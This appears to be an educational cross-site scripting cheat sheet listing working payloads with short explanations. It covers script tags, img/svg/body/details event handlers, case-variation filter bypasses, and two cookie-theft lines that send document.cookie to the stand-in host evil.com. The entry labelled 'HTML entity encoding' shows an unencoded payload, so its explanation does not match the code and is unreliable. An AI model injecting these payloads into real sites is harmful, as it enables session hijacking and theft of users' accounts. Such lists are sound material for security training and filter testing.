Browser Console
Basic Script Tags
<script>alert('XSS')</script>
Classic payload. Script tags execute immediately when parsed by the browser. Most modern filters block this.
<script>document.cookie</script>
Attempts to read session cookies. Shows what data an attacker could steal.
Event Handler Payloads
<img src=x onerror=alert('XSS')>
Bypasses script-tag filters. The broken image triggers onerror immediately — no user interaction needed.
<svg onload=alert('XSS')>
SVG elements support JS event handlers. onload fires when the SVG renders — no src attribute required.
<body onload=alert('XSS')>
Works when injected early in a page. Fires on document load.
Cookie Theft
<img src=x onerror="fetch('http://evil.com/steal?c='+document.cookie)">
Exfiltrates cookies to an attacker-controlled server via a GET request. The Fetch API makes it silent.
<script>new Image().src='//evil.com/?c='+document.cookie</script>
Older cookie-theft technique using a hidden image request. Bypasses same-origin policy for GET requests.
Encoded / Filter Bypass
<ScRiPt>alert('XSS')</ScRiPt>
Case variation bypasses case-sensitive keyword filters that only block lowercase 'script'.
<img src=x onerror=alert(1)>
HTML entity encoding. Browsers decode entities before parsing, so filters that check raw strings fail.
<details open ontoggle=alert('XSS')>
HTML5 element with event handler. Fires when the details element auto-opens. Often overlooked by filters.
